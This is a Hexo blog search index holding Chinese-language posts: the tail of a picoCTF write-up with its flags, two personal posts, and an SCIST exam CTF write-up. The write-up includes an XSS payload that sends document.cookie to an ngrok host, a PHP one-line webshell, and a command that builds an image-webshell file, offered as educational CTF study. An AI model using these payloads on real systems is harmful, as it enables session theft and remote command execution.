txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">picoCTF&#123;d3bugg3r_dr1v3_72bd8355&#125;</span><br></pre></td></tr></table></figure><h1 id="Misc-General-Skills">Misc (General Skills)</h1><h2 id="binhexa">binhexa</h2><p>這題比較簡單，就是一些基礎的 Binary operations 和最後把 bin 轉為 hexadecimal 就行了，它主要有六題的邏輯運算和一題 bin to hexadecimal。我是直接使用 picoCTF 提供的 Webshell 進行 nc 連接，然後用<a href="https://www.rapidtables.com/calc/math/binary-calculator.html">這個線上工具</a>運算。題目如下。</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">Binary Number 1: 00101010</span><br><span class="line">Binary Number 2: 00101011</span><br><span class="line"></span><br><span class="line">Question 1/6:</span><br><span class="line">Operation 1: &#x27;&amp;&#x27;</span><br><span class="line">Perform the operation on Binary Number 1&amp;2.</span><br><span class="line">Enter the binary result: 00101010</span><br><span class="line">Correct!</span><br><span class="line"></span><br><span class="line">Question 2/6:</span><br><span class="line">Operation 2: &#x27;*&#x27;</span><br><span class="line">Perform the operation on Binary Number 1&amp;2.</span><br><span class="line">Enter the binary result: 11100001110</span><br><span class="line">Correct!</span><br><span class="line"></span><br><span class="line">Question 3/6:</span><br><span class="line">Operation 3: &#x27;&lt;&lt;&#x27;</span><br><span class="line">Perform a left shift of Binary Number 1 by 1 bits.</span><br><span class="line">Enter the binary result: 1010100</span><br><span class="line">Correct!</span><br><span class="line"></span><br><span class="line">Question 4/6:</span><br><span class="line">Operation 4: &#x27;+&#x27;</span><br><span class="line">Perform the operation on Binary Number 1&amp;2.</span><br><span class="line">Enter the binary result: 1010101</span><br><span class="line">Correct!</span><br><span class="line"></span><br><span class="line">Question 5/6:</span><br><span class="line">Operation 5: &#x27;|&#x27;</span><br><span class="line">Perform the operation on Binary Number 1&amp;2.</span><br><span class="line">Enter the binary result: 00101011</span><br><span class="line">Correct!</span><br><span class="line"></span><br><span class="line">Question 6/6:</span><br><span class="line">Operation 6: &#x27;&gt;&gt;&#x27;</span><br><span class="line">Perform a right shift of Binary Number 2 by 1 bits.</span><br><span class="line">Enter the binary result: 10101</span><br><span class="line">Correct!</span><br><span class="line"></span><br><span class="line">Enter the results of the last operation in hexadecimal: 15</span><br><span class="line"></span><br><span class="line">Correct answer!</span><br><span class="line">The flag is: picoCTF&#123;b1tw^3se_0p3eR@tI0n_su33essFuL_d6f8047e&#125;</span><br></pre></td></tr></table></figure><p>這樣就得到 flag 啦！Easy peasy。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 資安 </tag>
            
            <tag> PicoCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Why Do I Start Blogging</title>
      <link href="/posts/e6118152/"/>
      <url>/posts/e6118152/</url>
      
        <content type="html"><![CDATA[<h1 id="Big-bang-宇宙的起源">Big bang! 宇宙的起源</h1><p>我其實從很久以前就有想要架設自己的網站，上了大學後又看到更多厲害的前輩們都會有自己的網站來記錄自己的成長，於是下定決心也要來建立自己的 Blog。再加上我今年（2023 開始）剛好把 Instagram 關版了（想挑戰一年不用 Instagram），所以剛好就利用這邊來記錄我的生活和技術類文章吧！（未來可能會順便紀錄一些旅遊、和朋友的約、blablabla）</p><p>在架站的時候也一直在想，如果我直接寫在 Medium 之類的平台是不是更方便，還能有快速的 SEO 成效。但後來想想，架在 Medium 終究是被動的，也不知道哪天 Medium 是否會像無名小站一樣倒閉，反而架在自己的站才是掌握了主控權。至於 SEO 的部分嘛，慢慢來吧！慢工出細活！</p><h1 id="對自己的期許">對自己的期許</h1><p>因為我是一個很懶惰的人 XD，所以希望我可以頻繁且持續的更新文章。並且期待自己可以累積到越來越多的讀者，最後也會希望自己的文章真的可以幫助到其他人！</p><h1 id="對讀者們的期待">對讀者們的期待</h1><p>希望大家看完我的文章後，有甚麼想法都可以在底下留言和我互動（這也是我會開留言區的原因，害羞的話按個表情也可以的）。又或是我在技術類的文章中可能有甚麼寫錯的地方，也都可以直接留言和我討論，我都會盡快地回復你。最後如果想持續的接收我最新的文章，也歡迎可以<a href="https://cx330.tw/subscribe">訂閱我的 Blog</a>！我會很感激的！</p>]]></content>
      
      
      <categories>
          
          <category> LifeAndTalk </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2024 Summer Intensive Training Plan</title>
      <link href="/posts/1bd6c34a/"/>
      <url>/posts/1bd6c34a/</url>
      
        <content type="html"><![CDATA[<h1 id="為甚麼要修煉">為甚麼要修煉?</h1><p>有鑑於這次 AIS3 Pre-exam 的成績不甚理想。我決定要來在這次暑假的時候展開特訓，來這邊立個旗。以下來講講我打算怎麼修煉！</p><h1 id="怎麼修煉">怎麼修煉?</h1><p>可能會像 IT 邦幫忙鐵人賽的感覺吧，但沒辦法到每天上傳，因為還有其他安排（專案 AND 和朋友出門）。不過我對自己的期許是至少可以上傳 30 篇 Write Up。範圍的話可能就包含 picoCTF 的題目、AIS3 Pre-exam 的題目以及各式各樣 CTF 平台的題目。對了忘記講，一個絕對要完成的目標是 picoCTF 打到 10000 分，因為我下學期要認真去 BEEF SOUP 上課了啦！然後為了加入戰隊分數得達標，下學期的目標是盡力拿個獎！</p><h1 id="大家可以幫我個忙嗎！">大家可以幫我個忙嗎！</h1><p>希望大家可以好好的監督我，我會開留言區，或是認識我的人也可以直接私訊我。如果我太久沒有更新文章可以來提醒我！如果我某段期間有事情、出去玩、blabla 的我應該會公告在網頁上，所以如果沒特殊狀況又沒更新就是我在偷懶，請監督我！</p><blockquote><p>“We used to look up at the sky and wonder at our place in the stars. Now we just look down, and worry about our place in the dirt.” — <strong><em>Interstellar</em></strong></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> LifeAndTalk </category>
          
          <category> 2024 CTF Training </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Security </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SCIST S4 資訊安全期末考 Writeup</title>
      <link href="/posts/be8e46ca/"/>
      <url>/posts/be8e46ca/</url>
      
        <content type="html"><![CDATA[<p>我在 2024 參加了 SCIST 課程，雖然常常聽不懂但感覺還是收穫不少。這是上學期最後的一個考試，透過考試來審查是否可以進入下學期的課程。(很幸運的我有過！雖然我覺得我還得多練)。所以以下是一些我有進展的題目的 Write Up。如果發現有錯誤或是哪裡不足，可以在底下留言區留言，我會十分感激！</p><h1 id="Welcome">Welcome</h1><p>這題我們可以從開發者工具發現類似以下的元素。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;key--double&quot;</span> <span class="attr">data-key</span>=<span class="string">&quot;49&quot;</span> <span class="attr">data-input</span>=<span class="string">&quot;?F&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">div</span>&gt;</span>!<span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">div</span>&gt;</span>1<span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>再透過以下的 index.js 代碼可以找到真正的 input。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (key.<span class="title function_">hasAttribute</span>(<span class="string">&quot;data-input&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (e.<span class="property">shiftKey</span>) &#123;</span><br><span class="line">            msg += key.<span class="title function_">getAttribute</span>(<span class="string">&quot;data-input&quot;</span>)[<span class="number">0</span>];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            msg += key.<span class="title function_">getAttribute</span>(<span class="string">&quot;data-input&quot;</span>)[<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        typingElement.<span class="property">innerHTML</span> = msg.<span class="title function_">replace</span>(<span class="regexp">/ /g</span>, <span class="string">&quot;&amp;nbsp;&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>每個標籤的 data-input 屬性是由兩個字符所組成，以上面的 html 標籤為例，當我們按著 shift 的時候按下數字 1 按鍵，實際的 input 會是<code>?</code>，也就是 index 為 0 的位置；但當我們只是單純按下數字 1 按鍵的時候，input 會是<code>F</code>，就是 index 為 1 的位置。</p><p>知道了這個特性後，翻找到一份 index.css 文件，將其打開會發現第一行有個註解，以下:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Passpharse : &quot;JP Jf3j-F@%#$4H%xw&quot; */</span></span><br></pre></td></tr></table></figure><p>我們用一般打字的方法，用 shift 切換大小寫，嘗試輸入 Passphrase。經過以上的轉換，便可以得到 flag。</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag = SCIST&#123;G0oD_1u(k_!&#125;</span><br></pre></td></tr></table></figure><h1 id="XSSER">XSSER</h1><p>看了題目給的 app.js 檔案，可以發現 Flag 是在 visit 函數裡面被設定的，如下。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">visit</span>(<span class="params">noteId</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> url = <span class="string">`http://127.0.0.1:3000/note/<span class="subst">$&#123;noteId&#125;</span>`</span>;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`[+] Visiting <span class="subst">$&#123;url&#125;</span>`</span>);</span><br><span class="line">    <span class="keyword">const</span> context = <span class="keyword">await</span> browser.<span class="title function_">createIncognitoBrowserContext</span>()</span><br><span class="line">    <span class="keyword">const</span> page = <span class="keyword">await</span> context.<span class="title function_">newPage</span>()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">await</span> page.<span class="title function_">setCookie</span>(&#123;</span><br><span class="line">        <span class="attr">name</span>: <span class="string">&#x27;flag&#x27;</span>, <span class="attr">value</span>: <span class="variable constant_">FLAG</span>,</span><br><span class="line">        <span class="attr">domain</span>: <span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="attr">path</span>: <span class="string">&#x27;/&#x27;</span>,</span><br><span class="line">        <span class="attr">httpOnly</span>: <span class="literal">false</span>, <span class="attr">secure</span>: <span class="literal">false</span>, <span class="attr">sameSite</span>: <span class="string">&#x27;Lax&#x27;</span></span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">await</span> page.<span class="title function_">goto</span>(url, &#123; <span class="attr">waitUntil</span>: <span class="string">&#x27;networkidle0&#x27;</span> &#125;)</span><br><span class="line">        <span class="keyword">await</span> <span class="title function_">sleep</span>(<span class="number">1000</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">`[+] error visting <span class="subst">$&#123;path&#125;</span> `</span>, e)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">await</span> page.<span class="title function_">close</span>()</span><br><span class="line">    <span class="keyword">await</span> context.<span class="title function_">close</span>()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而要觸發這個 visit 函數，必須在回報 note 的地方輸入一個正確合法的 ID，才會執行 visit 函數，程式碼如下。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/report&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; id &#125; = req.<span class="property">body</span>;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable constant_">NOTES</span>.<span class="title function_">has</span>(id)) <span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="string">&quot;Note not found&quot;</span>);</span><br><span class="line">    <span class="title function_">visit</span>(id);</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&#x27;Admin will check your report&#x27;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>接著先在網站嘗試隨意 POST 一個正常的 note，會發現網址變成了以下的形式。</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://lab.scist.org:20001/note/732733d42c28d7060c71be53a4dd491b</span><br></pre></td></tr></table></figure><p>其中&quot;note/&quot;路徑後面的<code>1e9dafbc67ea0516bacce8d5d36a3c7a</code>，便是一個合法的 note ID。</p><p>到了這邊，我原本以為是要把合法的 ID 和 XSS 的 payload 結合在一起，並在 Report 的地方提交。但經過助教的提示之後，知道應該是要把 payload 提交在 note 的內文，所以我開始重新研究一次 app.js 的程式碼。發現了之前沒仔細看到可能可以注入 XSS 的地方，如下。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/note/:noteId&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> noteId = req.<span class="property">params</span>.<span class="property">noteId</span>;</span><br><span class="line">    <span class="keyword">const</span> note = <span class="variable constant_">NOTES</span>.<span class="title function_">get</span>(noteId);</span><br><span class="line">    <span class="keyword">if</span> (!note) <span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="string">&#x27;Note not found!&#x27;</span>);</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">`&lt;h1&gt;Your Note&lt;h1&gt;&lt;p id=&quot;note&quot;&gt;<span class="subst">$&#123;note&#125;</span>&lt;/p&gt;`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>在這段程式碼中，可以看到我們提交的 note 會被夾在 p 標籤中解析，所以我嘗試注入<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>發現不能執行，因為 app.js 裡面限制了允許的標籤白名單，只有 s、b、u、p、code 這五個標籤能使用，其餘的標籤會被 strip 掉。知道可以用的標籤後，我使用了 p 標籤提交，嘗試執行 javascript，payload 如下:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;p/onmouseover=<span class="title function_">alert</span>(<span class="number">1</span>)&gt;test&lt;p&gt;</span><br></pre></td></tr></table></figure><p>發現 note 只會被解析成<code>test</code>，而移動滑鼠到上面的時候也確實會執行 js，因此接下來要做的就是修改 payload，並再提交 note 後去 report 的地方提交 id，讓 visit 去執行到我們提交的腳本，就可以得到 cookie 了。</p><p>我用 ngrok 在本地先架了個伺服器，並且嘗試透過其獲取 cookie，payload 如下:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;p/onmouseover=document.location.href=&quot;https://1ffb-36-234-174-194.ngrok-free.app/&quot;+document.cookie style=&quot;position:fixed;left:0;top:0;width:9999px;height:9999px;&quot;&gt;test<span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><p>但是因為 onmouseover 屬性需要有滑鼠滑過，即便我把 p 標籤調整的很大，但因為 visit 函數不會有滑鼠滑過，所以還是不會執行。很可惜到了截止的最後，還是沒能找出正確的 payload 獲取到 flag。</p><p>最後來談談這個漏洞在真實世界可能的危害，題目在每次回報完後都會提示<code>admin will check your report</code>，這告訴我們如果真實世界中有人利用 XSS 漏洞注入了惡意代碼，而當系統管理員去&quot;check&quot;的時候，自己的 cookie 可能就會被利用，讓有心人士可以在不知道 admin 帳號密碼的情況下以 admin 的權限登入系統。</p><h1 id="Uploader">Uploader</h1><p>在這題裡面，我先嘗試上傳了一張正常的圖片，發現網頁會呈現這樣的狀態。<img src="https://hackmd.io/_uploads/ByG6mhhcT.png" alt=""><br>我一開始先用了課程中教過的一句話木馬來嘗試上傳，我上傳的是 php 檔。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;command&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>結果系統會回應<code>not a PNG file</code>，這表示前端會檢測是否為合法的上傳檔案類型，我又嘗試把檔名修改為<code>shell.php.png</code>再進行上傳，結果系統的回應是<code>Invalid image</code>，表示後端也有檢測他是否為 PNG 檔案。後來又嘗試了很多其他的方法，包括在 php payload 前面加上 magic numbers <code>89504E47</code>嘗試讓系統解析為 PNG 檔，但得到的回應都跟前面差不多。</p><p>最後，在經過一番搜尋、查找資料後，發現只剩下一個方法，就是上傳圖片馬。所謂的圖片馬，就是把圖片和木馬組合在一起上傳。於是我準備了一張正常的 png(normal.png)和惡意的 php 代碼(shell.php)，將其放在同一個路徑底下。接著利用以下的指令將其組合為惡意圖片馬(pwn.png):</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy normal.png/b + shell.php/a pwn.png</span><br></pre></td></tr></table></figure><p>接著我將 pwn.png 上傳，發現系統回應<code>Bad content</code>，到這邊，比賽就結束了，結果最後還是沒能成功地取得 Flag，QQ。</p><h1 id="Common-modulus">Common modulus</h1><p>這題的題目給了三個 e(公鑰)，三個 c(密文)，還有一個 n(質數因子相乘)，如果有其中兩個 e 是互質，也就是 gcd(e1, e2) = 1 的話，就可以利用一般的共模攻擊，去求得 m(明文)，就是利用會有一組 s1 和 s2 滿足 s1 _ e1 + s2 _ e2 = 1 的條件，加上一點計算，去找出原本的 m，如下。</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">已知 s1 * e1 + s2 * e2 = 1</span><br><span class="line">==========================</span><br><span class="line">c1 ^ s1 * c2 ^ s2 mod n</span><br><span class="line">= m ^ (e1 * s1) * m ^ (e2 * s2) mod n</span><br><span class="line">= m ^ (e1 * s1 + e2 * s2) mod n</span><br><span class="line">= m mod n</span><br><span class="line">= m</span><br></pre></td></tr></table></figure><p>可惜這題的三個 e 都不是互質的，所以要用其他的方法，我就找到了<a href="https://blog.csdn.net/CHUNJIUJUN/article/details/120553701">一篇文章</a>，裡面的方法是這樣:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">gcd(e1, e2) = gcd</span><br><span class="line">c1 = (m ^ e1&#x27;) ^ gcd mod n</span><br><span class="line">c2 = (m ^ e2&#x27;) ^ gcd mod n</span><br><span class="line">e1&#x27; * s1 + e2&#x27; * s2 = 1</span><br><span class="line"></span><br><span class="line">c1 ^ s1 * c2 ^s2 mod n</span><br><span class="line">= (((m ^ e1&#x27;) ^ gcd) ^ s1) * (((m ^ e2&#x27;) ^ gcd) ^s2) mod n</span><br><span class="line">= m ^ (e1&#x27; * s1 * gcd + e2&#x27; * s2 * gcd) mod n</span><br><span class="line">= m ^ gcd mod n</span><br></pre></td></tr></table></figure><p>所以只要把最後算出來的 m 再開 gcd 次方根就能找到明文，於是我寫了下面的腳本。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> gcdext, iroot, gcd</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> inverse, long_to_bytes</span><br><span class="line"></span><br><span class="line">n = <span class="number">22777210958276255973049562078823322470680917129996977683503001216538435863571279721754251786904659128777249694642787480739356668460290853226080964490087136228546045908347764486557698226166963415933243390587759408509357466384117429023536043020407223339909068182712164327318468662771341384255178839693851749833498595767285757850112681038669603653206881003854674152787778849201349140811383067441876396986225542868926178627083357794996583066978454919162611524965685485188287561894204743004599366796640463833284730895990140454443706509700257117888543581605105114423861683342316455500361042572686499019143155407840720672419</span></span><br><span class="line">e1 = <span class="number">2755481107</span></span><br><span class="line">e2 = <span class="number">3066037283</span></span><br><span class="line"><span class="comment"># e3 = 3825027809</span></span><br><span class="line">c1 = <span class="number">7927632180925780686814468716254548866073876571301670927803568567992929927231666309788681512003760545920706822481579873353923145930555620003462589361971404649174770107086295817994744475096856399932862153021335565923236506465046739212222528807145844779588311833022632475905272022533594289777471811000950934146066045472218603345107418836739010466236517799411565681939684720963118217633594133046157469386003057018852372681387318985149400851657988757739939640107583630568340335757129814894759082226790230350623403635880468479392207604875482436028050237168056669104984504520909514306552404757744266671282270481535254632231</span></span><br><span class="line">c2 = <span class="number">19162894772364755634695403163786451410245098251726628084799257554767334519905640179161346412307514221332891648206034353728374020165930677162860102377777681292582203157662333178388904577242217496599789741706061676944395451665239726479077741007297709368920091594846785681021427819585722029936761040901809601396670202192052497066209075288103228744858127970671076282164969113619499174358765991380757911727424305398346399701274033326030443722686643479760852934150701783998463047750118216160431187984416861424972003041835112849345069144579908117061092179552843173803432427193984945136248106420527309951492325647621839772126</span></span><br><span class="line"><span class="comment"># c3 = 12281989205300534636704612304895466894728582803084654071108548003638296732533233324118128443432186580642178421360358569501856887776677567285142630332770995470034693283004693504328569378601328550606731466373274474890323776647142155504550689141803732334439130044963732806927780975317712578470165550637007845813598338398021681428237912733055103663278507239375781432804708170722603762602715296180599171769475818480578806749013564273888734572033232825425951511959908980277564593244704622649568752985829748683356507419796438898916535864730103144986484287500764463579887673117770889298009984153867524175061353407719439002075</span></span><br><span class="line"></span><br><span class="line">g = gcd(e1, e2)</span><br><span class="line">e1_ = e1 // g</span><br><span class="line">e2_ = e2 // g</span><br><span class="line">l, s1, s2 = gcdext(e1_, e2_)</span><br><span class="line">m = <span class="built_in">pow</span>(c1, s1, n) * <span class="built_in">pow</span>(c2, s2, n) % n</span><br><span class="line">m = iroot(m, g)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;flag = <span class="subst">&#123;long_to_bytes(m).decode()&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>只不過最後的答案是錯誤的，沒能找到正確的 flag。可能是因為本題的 gcd 太大，還要找其他的算法。</p><h1 id="參賽心得">參賽心得</h1><p>這次算是我第一次花了那麼多的時間打 CTF 比賽，之前可能就是自己在網路上解解題甚麼的，總的來說還是很有趣的一次體驗。而參加完這次的比賽，我也更加地意識到自己的不足，真的還有很多可以進步、練習的地方。即便可能有點被打擊信心，但我也不會氣餒，我要更努力的練習，沒事就多解解題甚麼的，增強自己的實力，希望可以在之後的比賽表現得越來越好！</p><h1 id="參考資料區">參考資料區</h1><ul><li><a href="https://yinwc.github.io/2020/04/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/#/%E5%85%B6%E4%BB%96%E8%A7%84%E5%88%99">文件上傳漏洞總結</a></li><li><a href="https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html">PERSISTENT PHP PAYLOADS IN PNGS: HOW TO INJECT PHP CODE IN AN IMAGE – AND KEEP IT THERE !</a></li><li><a href="https://ithelp.ithome.com.tw/articles/10245459?sc=hot">[Day 26] 026 - 串流加密法 - Stream cipher</a></li><li><a href="https://hackmd.io/@foxo-tw/slides/%2F%40foxo-tw%2FByAkemFv7%3Ftype%3Dslide%23%2F1">童舒晧資安資源整理(XSS 教學)</a></li><li><a href="https://xz.aliyun.com/t/3952?time__1311=n4%2BxnD0DBDgGG%3DG8%2BeDsA3xCqm%2Fz3K3r34D&amp;alichlgref=https%3A%2F%2Fwww.google.com%2F">安全工具——XSSer</a></li><li><a href="https://blog.csdn.net/mydriverc2/article/details/42048983?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-1-42048983-blog-113249158.235%5Ev43%5Epc_blog_bottom_relevance_base9&amp;spm=1001.2101.3001.4242.2&amp;utm_relevant_index=2">XSSer 使用(CSDN)</a></li><li><a href="https://blog.csdn.net/CHUNJIUJUN/article/details/120553701">关于 RSA 共模攻击 e1，e2 不互素的解法</a></li><li><a href="https://blog.csdn.net/qq_40345591/article/details/127476867">文件上传漏洞进阶教程/白名单绕过/图片马制作/图片马执行</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 資安 </tag>
            
            <tag> SCIST </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
